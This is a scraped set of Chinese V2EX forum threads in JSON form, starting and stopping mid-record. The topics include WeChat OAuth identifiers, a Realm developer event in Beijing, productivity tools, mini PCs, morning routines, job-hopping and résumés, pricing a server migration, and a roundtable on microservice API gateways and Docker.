获取用户基本信息，包括昵称、头像、性别、所在城市、语言和关注时间。”", " 我知道不能拿到微信号。\r", "我回复的意思是，别人知道你的微信号，就能够通过微信搜索得到跟“微信网页授权”给出的基本信息一样的信息，所以授权不算泄露隐私。", " 有一个条件就是同一个用户同时关注了同一供应商的两个公众号，好像就可以拿到那个固定的 id 了。", "  看官网文档是不可以的，只能让 openid 固定下来。\r", "\r", "\r", "“请注意，如果开发者有在多个公众号，或在公众号、移动应用之间统一用户帐号的需求，需要前往微信开放平台（ ", " ）绑定公众号后，才可利用 UnionID 机制来满足上述需求。”\r", "\r", "来自上面我的那个参考链接", "微信的授权会过期，记得是一周", " refresh_token 拥有较长的有效期（ 7 天、 30 天、 60 天、 90 天）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://dn-lhzo7z96.qbox.me/1486440827362\"></p>\n<h2>关于 Realm</h2>\n<p>Realm 是一个跨平台移动数据库引擎，支持 Objective-C 、 Swift 、 JAVA 、 JavaScript 、 Xamarin 等，于 2014 年 7 月发布。由 YCombinator 孵化的创业团队历时几年打造，是第一个专门针对移动平台设计的数据库。目前在全球拥有超过一百万用户在使用，包括 Google 、 Amazon 、 Dropbox 、 Ebay 、 Netflix 、 Alibaba 、知乎等都是 Realm 的资深用户。</p>\n<h2>关于 Realm WorldTour</h2>\n<p>Realm WorldTour 将在今年的 2 月- 3 月在全球的 23 个城市举办，中国也将是我们最为关注的地方，我们在今年选择在北京举办活动，希望中国的开发者们可以和我们一起会面，聊聊在使用 Realm 方面的体会，我们也将派出 Realm 的工程师和在中国的资深用户和开发者们深入交流。 Realm WorldTour Beijing 的活动目前已经邀请到了 Realm 研发工程师、知乎、 BearyChat 等公司的资深研发，以及几位 Realm 的深度使用者。</p>\n<p><strong>现场我们为各位参与者准备了丰厚的活动纪念品、啤酒、小食，希望能够为这次活动创造一个轻松愉快的氛围。</strong></p>\n<p><strong>当然我们还在招募 LightningSpeech 的分享者，成为我们的特邀嘉宾，欢迎愿意分享的开发者给我们提供更多的议题和使用经验。→<a href=\"http://form.mikecrm.com/AuU7Wt\" rel=\"nofollow\">讲师招募</a></strong></p>\n<h2>关于 Realm WorldTour Beijing</h2>\n<ul>\n<li>\n<p>活动报名主页： <a href=\"https://realm.io/world-tour/\" rel=\"nofollow\">全球活动页面</a>/ <a href=\"http://www.huodongxing.com/event/5373172729500\" rel=\"nofollow\">北京活动报名</a></p>\n</li>\n<li>\n<p>活动地点：海淀区中关村 e 世界财富中心 B2 联合创业办公社</p>\n</li>\n<li>\n<p>活动时间： 2017 年 3 月 11 日（周六） 13 ： 30-18 ： 00</p>\n</li>\n<li>\n<p>活动人数： 80-100</p>\n</li>\n<li>\n<p>活动安排：</p>\n</li>\n<li>\n<p>13 ： 30-13 ： 50  sign in 签到</p>\n</li>\n<li>\n<p>13 ： 50-14 ： 00  Introduction 开场介绍</p>\n</li>\n<li>\n<p>14 ： 00-14 ： 45  Topic 1 + QA</p>\n</li>\n<li>\n<p>14 ： 45-15 ： 30  Topic 2 + QA</p>\n</li>\n<li>\n<p>15 ： 30-16 ： 00  Coffee Break</p>\n</li>\n<li>\n<p>16 ： 00-16 ： 45  Topic 3 + QA</p>\n</li>\n<li>\n<p>16 ： 45-17 ： 15  Lightning talk*3</p>\n</li>\n<li>\n<p>17 ： 15-18 ： 00  Free talk</p>\n</li>\n</ul>\n</div></div>"], "reply": "3", "tittle": "「活动报名」2017 Realm WorldTour Beijing/Realm 世界之旅北京站", "comment": ["V 站上用 Realm 的小伙伴多么？", " 我司 Android 端用 Realm, 最早的时候 iOS 也用过。", " BearyChat 的技术栈好丰富哈！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这并不是一个写年终合适的时间点，不过由于 2016 对我有特殊的重要性，还是在开工前头赶出这篇 2016 年终总结。主要写一些关于技术、互联网产品、电影和游戏的内容，不会有太多生活元素在里面。</p>\n<p>内容提要：</p>\n<ol>\n<li>2016 做的最赞的事情：用 TiddlyWiki 做知识管理</li>\n<li>2016 最喜欢的互联网产品\n<ul>\n<li>TickTick</li>\n<li>Slack</li>\n</ul>\n</li>\n<li>2016 最喜欢的电影：「美国队长 3 ：内战」</li>\n<li>2016 最喜欢的游戏\n<ul>\n<li>INSIDE</li>\n<li>GTA V</li>\n</ul>\n</li>\n<li>2016 总结与展望</li>\n</ol>\n<p>全文链接： <a href=\"https://zhuanlan.zhihu.com/p/25090038\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/25090038</a></p>\n</div></div>"], "reply": "18", "tittle": "一份迟来的 2016 年度总结", "comment": ["TiddlyWiki 很棒！感谢推荐\r", "\r", "另外赞一下头像。 FEZ 神作", " 放了一天终于有人回复，感动！", "买了滴答清单免费订阅", "年费", " 赞！", " FEZ 现在可以很便宜买到。 ", " 居然这么便宜！可以买来送好友。但是似乎是下载一份游戏拷贝。作为常用玩家，我还是会买 steam 上的 FEZ ，万一以后有更新呢。\r", "比如这个 patch ： ", "试了一下 TiddlyWiki ，为什么网页都保持到桌面了？怎么设置保存路径呢？", "  \r", " 用的是这里面的哪种方式？推荐用 Node.js 版 + Dropbox （或者坚果云）同步", " chrome 版的， Node.js 我不懂啊", " \r", "\r", "可能是你 Chrome 的默认下载位置设在桌面了？\r", "\r", "Chrome 版估计不是太方便，可以试试这个 TiddlyDesktop ： ", " windows 版的怎么下载不了啊？等了半天，一动不动的", " 中国访问 GitHub 的速度比较慢，你可以用一些翻墙工具加速下。。\r", "\r", "我下了一份传到百度云上了：\r", "\r", "链接: ", " 密码: 432k\r", "\r", "不过我自己用的是 Node.js 版本，我也不确定 TiddlyDesktop 用起来顺不顺手", "   滴答清单现在有什么优惠的渠道吗？", " 电脑上买比用 iphone 的订阅要便宜。仅此而已。", " 今天看到一篇文章 ", "\r", "原来 FEZ 上架 itch.io 是为了抵制特朗普颁布的穆斯林禁令，收入所得会捐给 ACLU 。真心给力", "之前还说那个技能表是啥做的呢，谢谢科普 ", " 你是说知道创宇那个？它应该不是用 TiddlyWiki 做的。有一些服务可以实现那种效果，比如 Dynalist"]},
{"content": ["<div class=\"topic_content\">看到马云机的占美的机子\r<br><a target=\"_blank\" href=\"https://item.taobao.com/item.htm?id=520511513800\" rel=\"nofollow\">https://item.taobao.com/item.htm?id=520511513800</a>\r<br>\r<br>当然还有其他牌子的，比如高富帅的 intel ，台企的技嘉，不过略过~\r<br>\r<br>有用过迷你主机的朋友吗？值得入坑吗？</div>"], "reply": "2", "tittle": "那些迷你主机好用不？比如 intel，技嘉，占美的？", "comment": ["Intel 的 NUC 骷髅峡谷很好用，我认为高性能电脑里这货是体积最小的，小体积电脑里这货是性能最好的。", "TB 整机好像很吓人的，会变成烈士。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>长时间晚睡，经常上火，白天打不起精神，精力也容易分散，很影响工作的效率。</p>\n<p>每次预计要做的事总是各种原因没做好，感觉好忧伤。</p>\n<p>现在准备早起一个小时，晚上 11 点之前准时睡觉。问下大家，早起一个小时能做些什么有意义的事情呢，最好能提高下精神状态的，跑步就算了，大成都自上班开始就雾霾天。。</p>\n</div></div>"], "reply": "116", "tittle": "早起一个小时能做点什么", "comment": ["坐早点的车上班，不堵在路上，心情会好点", " 分享一下你的 FM 吧😋", "早起运动", " 大哥你背单词用音标吗?我不会音标.", "这个还要看起来有没有事干，有了目标就好办了，没有目标的话，其实起来也不知道该干啥。\r", "我现在是十二点睡觉，早上七点半起。洗漱半小时。但是八点到九点这一个小时并没有怎么利用起来，基本就是刷刷微信、论坛、网站。所以每天起来的时候就感觉没动力。现在正在给自己找活干。", "我现在都是晚上健身之后就回家听听音乐睡觉，大概 10 点半左右睡觉。然后早上一般 6 点半起床，洗漱啊，做 4 组俯卧撑，烧水泡茶，出门吃早饭，然后大概 6 点半左右开始看书到 8 点半。然后骑着电驴上班。。。", "10 点上班， 7 点起床，(走去公司 7 分钟)7 点半到公司健身，跑步半小时， 8 点 10 分去公司打份早餐， 8 点 15 到宿舍， 8 点 15 到 9 点看看动漫(考虑换成背单词)， 9 点到 9 点 50 ，洗个澡，整理一下，把脏衣服拿去洗，最晚 9 点 30 分出门，走去公司 7 分钟。一班 9 点 40 分到达公司，准备下晨会说的东西，每天如此，周末一样。", "冥想~", " 早晨是去学校操场跑吗", "睡个回笼觉", " 这个生活好规律", " 这个厉害啊", "不打算干什么的话可以设定一些没用的小技能。\r", "比如练摩斯码，玩娃娃机，麻将口诀，摇塞子。\r", "最近在看时尚杂志，觉得这个是我屌丝气质的根本。", " ", "看看简短的正能量的文章，听听广播，泡杯茶，黑芝麻，豆浆，有时间煮点绿豆粥喝。", "跑跑步？做点营养早餐。看看新闻"]},
{"content": ["<div class=\"topic_content\">参加工作三年，已经陆续离开了五家公司。经历过团队解散、项目解散、公司转型以及公司关闭等状况，导致家里人经常调侃我是不是专门出去坏事...\r<br>\r<br>重写一下简历，希望下一份工作稳定可靠。\r<br>\r<br>新的一年，求好运。</div>", "<div class=\"topic_content\">已经在求职节点发布新帖子啦，欢迎围观和骚扰 <a target=\"_blank\" href=\"/t/338652\">/t/338652</a></div>"], "reply": "59", "tittle": "今天在家重写简历", "comment": ["so, 下一份工作 尽量慎重考虑", "同求好运，我的情况和你差不多，经历过的公司命都不长，我都不好意思写了。", "祝好运!", "好尴尬", "3 年 5 家，虽然有不可抗因素，但是频率也是高，祝好运！", "不要写那么多", "先找一家看上去不太可能倒闭的公司去转转运.", "加油，最近我也在整理简历。", " \r", " 是应该慎重加慎重才行\r", "\r", "\r", " 最尴尬的还是厚着脸皮回家过年\r", "\r", "\r", " \r", " 或许都写上也不是坏事吧，经历过就能有成长，不算是白去一趟", "还是大公司稳定", "我们以前组里有位组员也是，前后去了 8 家，都倒了…然后去年我们组也被拆了，哈哈哈 LZ 找个稳定点的吧，这样对你的技术成长挺不利的", "和我差不多…", "你试试面试就知道了，看看别人怎么评价。", " \r", " 确实，技术方面不能专注在一个方向上，很难深入下去", " 不对吧 你至少要有一个方向深入的技术，否则什么都会什么都一知半解，有什么优势", "去 BAT 吧 要是 LZ 能把 BAT 弄倒了 我就真的服了~:D", "好厉害...公司终结者！", " 也是有的\r", "\r", " 你这样我很有压力", "我一年换了 4 家。。。。还是实习期", "希望 LZ 去百度吧", " 我正想这么说 :D", "看哪家公司不爽就去哪家公司", "三年五个公司，咋弄的呢？", " 为什么不写，这个可以证明你的工作经验丰富，而且所有离职不是你个人原因，而是公司的原因，这证明你不是个心气浮躁，可以脚踏实地干活的人。\r", "\r", "而且，公司倒闭或出事之前肯定会有征兆，那你都能坚持到公司开不下去，证明了你是个可以依靠的员工，不会因为公司的暂时不利能离职，哪家公司不喜欢这种可以共患难的员工。", "换句话来说，如果有公司真因为你呆过的公司统统倒闭而害怕招你进来会导致公司倒闭的话，那这样公司不去也罢，公司倒闭不找公司的原因而是去找员工的负责，一是公司高层格局小，肯定作不大，二是公司高层会甩锅，小心去了背黑锅。", "我也正有此意 打算过一段时间换个", " 想不明白\r", "\r", " 公司因为普通员工关门的，大概是被删库跑路？", " 然而很多公司都不是这么看的，看起来你相当于跳槽，而简历你也就算写了解散解散，人家一看这么多公司就首先怀疑你跳槽太多。", " 删库跑路这种段子你也信啊，哪家公司没有数据备份业务的。而且，员工离职都是提前申请的吧。", "我也考虑要离职，借此随便问一下：大多数公司是不是会因为简历上就职时间未满一年就觉得此人不可靠？", " 是 尤其多次不满一年，即使能力合格，我也会犹豫。", " 我现在这家公司的发展前景不明朗，我在考虑是否要待多 2 个月待满一年再离职。 Thank You.", " 正好看到您的回复，想问下，作为求职者如果面试的时候觉得还不错，进了公司后，又觉得公司没有想象的好，比如说之前说有年终奖，后来没了，类似这种的，那我看到这种情况，刚过了试用期才发现，经历 4 个月左右就去离职了，这个情况您如何看待？对比不满一年的如何？\r", "另外，如果在这之前有份两年的工作经历，后来去了一家倒闭了（ 6 个月），这是第三家不想待了（ 4 个月），这样子的情况再找新工作是不是也会有困难？", " 1 年和 8 个月区别不大，有好机会走就行", " 这样的简历我会考虑很多，只要有其他面试者能力和你差不多的优先选别人。你换位思考下，作为主管，你希望团队是怎么样的？你希望招聘的人提供什么价值？如果一个人总是变动，倒闭说明选择不慎重，再往下就是对行业的理解等等；频繁跳槽是自我认知与社会认知不符居多。随便举个例子，你说的年终奖没了，是你表现不好，还是所有人都没有？这里面不可控因素太多了，招你进来我怎么知道你下次离职是因为什么因素走？", "想起了 群里一哥们说一年换 3 家  去哪家哪家倒闭(三线城市)", "   哥们入个党先？？？（手动滑稽）\r", "\r", "\r", " 去 BAT 也有可能项目小组解散内部转不出去只能离职.....", "   ", "    有备份也不一定靠谱啊！", "怎么和我经历一样，认识我的人把这贴发给我还问是不是我发的贴。", "哎，我和楼主恰恰相反，每家我离开的公司都发展越来越好\r", "最近有个前东家要在美国上市了。。", " 连我这样的也算经常变动啊？我之前有做过满两年的啊。。只是最近变动大了一点而已\r", "倒闭是六个月后倒闭的，这也能算选择不慎重吗？\r", "不过你说的很对，之前的确没意识到行业的重要性，总觉得只要是做开发，无论在哪个行业都差不多，直到现在这个公司才让我意识到问题，真的是一失足成千古恨，年终奖只是我的一个例子，实际上让我想离职的是因为加班频率高，并且深，和之前面试说的不一样，所以导致心理有落差，最近公司还强行改变了上班时间，具体的可以看我最近发的一个贴子\r", "\r", "那前辈，现在有什么意见能给我呢？让我继续待满一年？", " 什么公司啊？", " 换个思路朋友，待多久不是关键问题，关键问题是你提供什么价值能换来下一个好的 offer 。如果价值不够，想办法提升价值。提升价值在哪都有办法。", " 那意思是我这样其实可以跳，只是相对来说，比起同样经验的人会吃亏对吧？", " 换位去想，不要老站在自己的角度想问题，吃不吃亏是相对的，你的目标是什么，怎么达成？", " 反正我们公司的数据库每半个小时备份一次。备份除了部门主管没人有权限操作。哪怕真的丢了，也不是损失半个小时的数据而以， 对于数据流动不是很大的数据库来说，半个小时的损失还是可以承受的。\r", "\r", "而且，删公司的数据库已经照成了公司的经济损失，公司直接报警抓人都可以了吧。而且，如果遇到一些牛气的点的公司，估计就是直接上门扣人，再报警了。\r", "\r", "最后，职业道德是个好东西。", " 当前要找的工作待遇其实和现在的是一样的，只是希望不要加班很多，很夸张到 1,2 点的\r", "只是换个环境而已，其他并没有什么不同", "前端吗，可以考虑来阿里试试 (*^__^*)", "选择很重要，选择很重要，我就说两遍", "你应该去百度~", "占个位置放一下，\r", "    我的简历： ", "\r", "    网页版： ", "\r", "   Stackoverflow 版本:  ", "\r", "求抱大腿。", "不要写那么多，合并几个，倒闭了的工具没人去追溯。", "职场有时候会忌讳工作的频次，当然，不同的人会走出不同的路啦，", "不要灰心，，，好好加油", "有个同事比你倒霉多了,工作两年,去的公司(3-4 个,忘记了)不是项目解算就是公司倒闭,我称她为---\"公司杀手\",不过现在她还是比较稳定,公司还不错的", " 杭州吗？人在上海，暂时不考虑杭州啦\r", "\r", " 感谢鼓励", "3 年 5 家  谁敢要", "三年高考五年模拟。 \r", "三年工作五家公司。 :D", "什么叫孔夫子笔删春秋，述而不著，该省的省啊"]},
{"content": ["<div class=\"topic_content\">最近在找 python 的工作，投了许多简历，今天有个公司打电话给我，巴拉巴拉聊了许久，然后又让我看了他们网站的系统，说让我先了解下，那时候就感觉有戏。\r<br>花了一个多小时看完了他发过来的视频后，打电话给他，我说我了解你们的系统功能了，你现在招 python 是打算开发新功能还是后期维护啊？结果他一句话就把我说懵逼了，他说我找你是要把现在用的那一套程序迁移到另外的服务器上，好吧，遇上找外包的了，哎，外包就外包吧，蚊子再小也是肉啊\r<br>公司在上海，服务器数据大概有 30+W 条吧，如果我和他谈价格，应该开价多少呢？（价格和时间还没谈，我跟他说面谈之后再决定的）</div>"], "reply": "12", "tittle": "生产服务器迁移该收多少钱啊", "comment": ["哎呦我去，迁移不是家常便饭吗？根据自己的能力要薪资，", "1000 元+免费维持一个半月稳定运行（如果是技术导致运行不稳定，从修复的当天后再加一个半月，新加功能不算）。", " 这也太廉价了吧。。。中间不可控的事情太多了", "不接，你家运维干啥吃的？\r", "想招运维或者 devops 可以再商量", "以前上线有部署文档，简单很多，只给服务器密码，全靠你查看环境和数据，依赖复杂的话，新迁移需要调适各种坑。", " 楼主说了蚊子再小也是肉啊 \r", "\r", "你觉得这种服务器维护要多少钱？？\r", "\r", "话说，上次帮一家伙弄服务器，我要了 380 元， 2003 系统中毒，他找了其它人帮忙弄，没弄好，留下一个烂滩子给我收拾。还远程，不给我服务器的密码。想想，唉，这算是什么活呀，弄得自个这么累。\r", "\r", "不知道是不是自个下不了狠心，要个高价格。", " 就像你举的例子，至少也得 1000 以上。其实维护也分两种，一种是弄好暂时能用就撤，一种就是把东西全部理清，记录下来，方便以后维护。后者专业程度要高很多，收费自然也应该贵点。", "   好吧，以后我接服务器的活，也得至少 1000 以上。\r", "\r", "其实我接过好几个服务器的活，但都不超过 500 ，我感觉这种小东西对我来说太简单了。应该是我不会定价吧。不了解行情。", "这种单敢接吗？\r", "要是没遇坑的话可能 2 、 3 小时搞定，要是遇到坑的话可能几个月都纠缠你。", " #9 正解，没坑就是很简单的事，如果有坑就麻烦了。问题就是有没有坑得等你踩了才知道，而且，踩到了也不代表只有这一个坑。", "阿里的上云服务，都是 5000 起的~", " 说的非常非常有道理！\r", "\r", "就怕有大坑。遇上大坑，几个月你没完没了的。精力不够的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>架构师小组交流会是由国内知名公司技术专家参与的技术交流会，每期选择一个时下最热门的技术话题进行实践经验分享。</p>\n<p><strong>第一期：</strong><a href=\"http://blog.qiniu.com/archives/7523\" rel=\"nofollow\">来自沪江、滴滴、蘑菇街、扇贝架构师的 Docker 实践分享</a></p>\n<p><strong>第二期：</strong><a href=\"http://blog.qiniu.com/archives/7972\" rel=\"nofollow\">来自滴滴、微博、唯品会、魅族、点评关于高可用架构的实践分享</a></p>\n<p><strong>第三期：</strong><a href=\"http://blog.qiniu.com/archives/8079\" rel=\"nofollow\">京东、宅急送的微服务实践分享（上）</a></p>\n<p>第三期小组交流会邀请到了国内电商领头羊京东、宅急送技术负责人，在上篇<a href=\"http://blog.qiniu.com/archives/8079\" rel=\"nofollow\">京东、宅急送的微服务实践分享（上）</a>中他们介绍了各自产品的微服务实践，本次他们就 API 网关的设计、服务的 Docker 化、服务测试、持续集成等具体话题展开了讨论。</p>\n<hr>\n<h2>话题交流</h2>\n<p><strong>Q ： API 网关是怎么设计的？</strong></p>\n<p><strong>京东章耿：</strong>我们有个 HTTP 的网关，但不是一个对外网服务的一个网关。对外的话业务自己都有一些网关，例如无线有自己的网关，网站有自己的网关，而另外一个公共的开放的是一个叫京东开放平台的网关。然后我们的网关干嘛用的？主要做的就是一个跨语言支持用的，协议转发和限流。这个网关存在的意义，主要是为了让有的调用端不用杰夫协议，或者不依赖服务端的情况下，来调服务端的服务。最主要就是刚才说那个 HTTP 转成内部协议的一个转发的功能，其次我们在上面做了一个接口级隔离，不要一个接口就把网关搞挂。还有一个就是限流，每分钟调多少次。还有授权，以前的网关转发的做法，一般是比如说类似于一个 VIP ，然后前面挂个域名。然后那个虚 IP 后面挂的服务列表一般都是要手动维护上。而我们的网购自动就挂到这个网关上面，就是一个服务发现，还有就是我们的结果，统计方面，我们会统一包装一下，我们的网关主要是做这个功能，现在一天应该是几十亿的调用量，九十台，差不多这些。</p>\n<p>服务发现是到数据库里面去读服务列表，从注册中心读出来以后会推给我们的网关。网关跟调用者是类似的。它其实也是一个调用者，只不过它是一个代理的调用者。它的服务列表，也是从我们的注册中心订阅的，不直接连数据库，可以认为自己是调用者。网关第一次去注册中心去读，后面的话我们可以推变化的部分。比如说你原来 1000 台，你要是加了一台，按以前拉的思路你会拉 1001 台，然后你自己比较一下，多了哪一台。但我们现在不是，我们现在是反向给他推加一台。这样的话，大量的减少那个，还有网络 IO 的推送。京东章耿：我们想用 nginx+luaw 做一个 HTTP 转我们内部 JSF 协议的，但不是 worker 就是一个进程。会产生很多长链接，所以我们后来就放弃了，我们现在是基于 nitty 做了一个转发，就是对外是 HTTP ，对内就 JSF 协议。也做了一些授权，限流，还有服务之间的线程隔离，服务发现，还有一个是结果的包装，包装成标准的 HTTP 的响应。因为像对外网的那些其实都是有自己的系统，不管你是无线，还是 PC 他都有自己的系统，那个不需要我们做。对第三方的话，它也有其中京东一个开发平台，还有更严格的那个验证，我们这个主要还是做协议转换的 API 网关。</p>\n<p><strong>Q ：你们怎么验证请求的合法性的，你们采用什么方法？就是就那种效率与安全性的这种平衡你们怎么做的？</strong></p>\n<p><strong>京东章耿：</strong>我们是有个授权，就是有个应用 ID ，京东是每个启动的都有个应用 ID ，带着那个应用 ID 过来，我们也可以支持头上带 token 。京东开放的那种是对外比较严格，我们这个不需要那么严格，反正就看你对象，就看你的网关给谁用了。</p>\n<p><strong>Q ：你们现在有两种类型，一种是内部之间调用的，另外一部分是外部调用内部的调用你们系统。</strong>\n<strong>京东章耿：</strong>那个是开放服务，有些供应商内部的系统，想要调京东的系统，那种就是京东开放服务，是需要 Oauth 认证。</p>\n<p><strong>京东章耿：</strong>HTTP+keepalive 也挺快的，因为它无非就是头上大一点， HTTP 的头大了一点。但如果后台是调 redis 那就比较明显的感觉，那如果后台是一个有个几百毫秒的，那你感觉不到那么明显。如果后台，你这就是读不取一下，读一下 redis ，你感觉比较明显。我们这边是用 netty 做的 HTTP 跟二进制都是在同一个端口支持的。</p>\n<p><strong>Q ：你怎么划分，哪些用二进制的，那些用 restful 协议的呢？</strong></p>\n<p><strong>京东章耿：</strong>那个我们没有强制要求，业务它自己想用什么用什么。\n<strong>京东章耿：</strong>对我们来说，它一启动端线口它就支持这两种协议。启动同一个端口，两种协议都支撑的。</p>\n<p><strong>Q ：你们是怎么区分一种端口种协议的呢？</strong></p>\n<p><strong>京东章耿：</strong>每个数据包括头上前两位不是模数位吗？它们都有自己的模数位。然后我们自己协议有自己的模数位，你 HTTP 就是那几个打头的 H ，然后我们的 decode 是自动装载的，它不是说你可以一开始装载一个什么那是适配器 decode 。当你请求来的时候，你再自动装载量，因为我们是超链接，不管你是 HTTP ，我们一般都默认开启 keepalive 也是个超链接。其实，你可以知道这个长链接对应的是什么协议。</p>\n<p><strong>Q ：它一般保持稳定的一个超链接，肯定是一种协议持续下去，不可能说动态的变质。</strong></p>\n<p><strong>京东章耿：</strong>是，看效率要求，其实 HTTP keepalive 也还可以，性能也还可以，如果不是那种调量特别特别大的话，它效率也还是可以的。然后 debug 的时候可能可读性会好一点。二进制最大问题还是比较麻烦，特别是，我们现在用 message pack ，然后会生成一堆的代理类，模板类，反正问题也比较麻烦。</p>\n<p><strong>宅急送石廷鑫：</strong>我们都用 Spring cloud 的那一套，然后自个改了一部分东西。像 Consul 好像也和 Zookeeper 一样的问题，所以说后边都改造数据库了。我现在用的是开源的 eureka ，只是后边从属变了。目前来说还没发现问题，因为我没有跨机房的问题。如果是跨机房的话，基本上都是数据库同步，两个数据之间同步的问题。</p>\n<p><strong>京东章耿：</strong>一般我们是有一个功能服务降级，其实最主要还是业务部门自己的代码实现，那我们其实有提供一个 mok 功能，就是那在我们配置这边直接配上一个，如果这个接口不可用返回的什么东西有没有开关，这也是可以。但是这个用起来比较少，一般他们自己在业务代码上也是容错的，就是没有说从平台这种角度去搞，一般都是自己考虑。然后如果是有一个目视跟踪系统的话，就一般的也可以跟踪整个调用链，就会看出来这个。比如说这个接口它依赖其他的接口，然后京东其实是没有投资这么细，因为目前我们分公司跟踪还没有上，我们现在主要是依赖我们内部的一个应用管理系统，我们叫 JOne ，有点像自动部署。我们每个进程启动的时候都会带上这个应用 ID ，在我们管理端是能看到这个接口是属于哪个应用的，我们只能看到应用级别的，这个应用调了哪些接口？哪些接口依赖？调的那些接口还被谁调用了？到这个级别。</p>\n<p><strong>宅急送石廷鑫：</strong>我们用 Springcloud ，熔断机制的降级处理的话,它有一个统计的接口，基本上按那个规则来做。调用关系的话，一个是我们做了一个 trace ID ，就是 google zipkin ，它本身有自带的工具。还有一部分就是服务的排层，我们现在就是用 camel 来做的，把这个业务整个来排层次做，大体是这样。目前来说，大的情况就是监控时会有一些出经常会出现一些抖动。就比方说 trace ID 那部分，不能用它自带的 stream 的模式。我们现在还是用 elk 来做，然后把 trace ID 打出来，然后做了一套简单的监控，类似于模仿它整个 trace 的路径。当然不要用 google 自带的监控，我们发现机器多了自带的监控不太可靠。我们都是做到日志里面，然后用 elk 收集起来。说起来自个做一个监控的调用量，这个就是稍微有点延迟。</p>\n<p><strong>京东章耿：</strong>我们这边最近正在做，然后我们的思路是这样的。有个包放在应用里面，它会输出日志，然后我们有一个日志收集，原来就有日志收集的我们只是扩展了一下。在每台机子上把它收到一个 kafka 里面，然后后面是用一个 storm 去把它读出来，写到 H base 里做分析，然后我们是有个采样率的一个概念，比如说一千次，才写一次，或者是一万次才写一次，做个采样率。然后最终我们现在是分两部分，刚才说写 H base 是一个离线数据，其实我们还有一些简单例子，就是直接做一些统计，实时的，大概延迟在一分钟左右。</p>\n<p><strong>Q ：关于服务的 Docker 化有什么进展？</strong></p>\n<p><strong>京东章耿：</strong>我们主要还是应用级别的 Docker 。现在只是说，可能这种发布模式会改一下。现在是基于一个 Docker VM ，比如说你起来以后，其实整个镜像文件都在那里。然后你弹的时候其实还是比较慢的。比如我要扩的话，得先创建一个 Docker 的 VM ，再把那些东西复制进去，才能有个装机的过程。就是比较慢一点，可能得分钟级别才能把它给提起来。但是未来我们希望把它改用镜像的那种形式，就你上线完成以后，生成一个镜像。每次上线，你只需要布一台机器，后面全是复制的一个过程。未来会改成这样，估计今年开发，明年推。现在相当于要布 20 个节点，那相当于是给你 20 个 Docker VM ，你上线发布 20 次，未来是希望给你一个，然后你发布一次以后，系统自动给你复制 19 个。而且反正后面服务发现什么这些都是原生的，都是无所谓的。</p>\n<p><strong>京东章耿：</strong>京东的 Docker 主要解决资源调度的问题。就相当于现在部物理机，你可能自己要需要部署机器 。但 Docker 可以把资源分配均匀一点，用算法给算出来，在分配时不会分到同一个机架上，不会分到同一个主机上，还有不会分到很繁忙的机器上。这些都会帮你考虑一下。</p>\n<p><strong>京东章耿：</strong>京东这边是自己有一套部署系统，虽然他没有像你说就镜像这样发布，虽然没这么快，但对于我们开发人员上线来说，其实是一样的，他只需要配一下，然后一点，他 24 台自动就上去了，就是有一套工具，也很快。只不过，他需要提前创建好，比如说你刚才说 20 个，你要提前创建 20 个 VM 。就比镜像的话肯定是要慢在这一步，你镜像的话，你直接拉下来一起，然后可以调度到哪台机子上到个 Docker API 一调，他直接就提起来了，那也是我们未来的改变方向。</p>\n<p><strong>七牛陈爱珍：</strong>我们的数据处理系统系统上运行的都是 CPU 密集型的计算，获取一个原文件，进行数据处理算法的执行，比如对一个视频进行转码，而在转码的过程中需要大量的 CPU 资源来进行处理，处理完后就可以获得预设的文件样式。不同的数据处理对资源的需求是不一样的，比如获取一个文件的 hash 值，这个处理逻辑非常简单，也没有大量的运算，配置的资源就相对小一些，而视频转码则非常的复杂，配置的资源就会相对多一些。现在在我们的平台上运行了数千种数据处理应用，每种处理的的请求量不一样，比如有些图片处理每秒可以达到数十万的请求量，而有一些则可能是每秒几万的请求量，几千种数据处理应用的高峰期也不一样，有些可能在早上，有些可能在晚上，并且每种处理都会存在突发流量的情况，比如一些电商型的客户，在做大促销时，就会导致图片处理的请求量突增，而一些音视频的客户在会在一些活动时会突然增长对音视频的处理。</p>\n<p>这个系统的核心问题是如何把硬件资源对每一种应用不同高峰期的请求量和突发流量做合理的资源分配，不合理的资源分配就可能会造成资源的浪费，或导致负载过重的机器会宕机，不能及时响应用户的需求。原有的系统架构的资源是静态规划的，也就是把指定的资源给指定的应用使用，而这种资源的分配往往是按照每个应用的业务高峰进行规划的，为了应对突发的流量并会预设一定的冗余，那么这样就会需要准备很多的资源。后来我们使用容器，因为容器可以封装环境，动态迁移，底层使用 Mesos 做资源的调度，这就可以对整个环境按需动态分配，很好的解决了资源利用率的问题。</p>\n<p><strong>Q ：关于服务测试、持续集成，大家分享一下实践经验吧。</strong></p>\n<p><strong>京东章耿：</strong>持续集成我们这边其实在编译环节就做了，上线我们这边是有一个灰度上线功能。我们有一个预发布环节，它可以直接把它标记为预发，然后有个测试平台可以对它进行一个服务的测试。那如果是正式环境的话，那就他就得自己想办法，因为我们现在这个环节是不能随便测试的，因为我无法判断你这个是读还是写，我不能让你随便测。</p>\n<p><strong>Q ：因为你们是把一个业务系统拆成了很多这种服务化的服务去跑，那肯定是要涉及到这种单元测试、集成测试和业务流的这种测试，那这种测试的话你们都是怎么做的呢？</strong></p>\n<p><strong>京东章耿：</strong>这边都是提前测的，就是你测都没测，那你根本就提不到上线这一步。你上线的时候必须有一个测试审批通过，其实他其实就是已经在线下就测过了。</p>\n<p><strong>七牛陈爱珍：</strong>我们是基于 Jenkins 做的持续集成，把代码上传到 Github 后，会做自动的代码静态检查和单元测试，再做自动的集成测试。这样的好处是开发只需要开发代码，不需要构建环境，都是自动完成的，而且反馈的速度也会非常快速。</p>\n<p><strong>宅急送石廷鑫：</strong>测试环境是由开发人员去部署，线上正式环节，是从这个测试环境把报测试通过去的，直接拷贝过去。我觉得 Docker 是解决整个配置的问题，因为生产环境测试环境和开发环境不一样。配置环境这个东西很难很麻烦做的，尽可能就是 UAT 的环境和测试环境，就是用户测试的环境和线上的环境尽量是一样。现在不是有配置管理吗？这三个环境能来回切换。比方说 spring boot 这种，实际上就是一个 Jar 包命令。 Jar 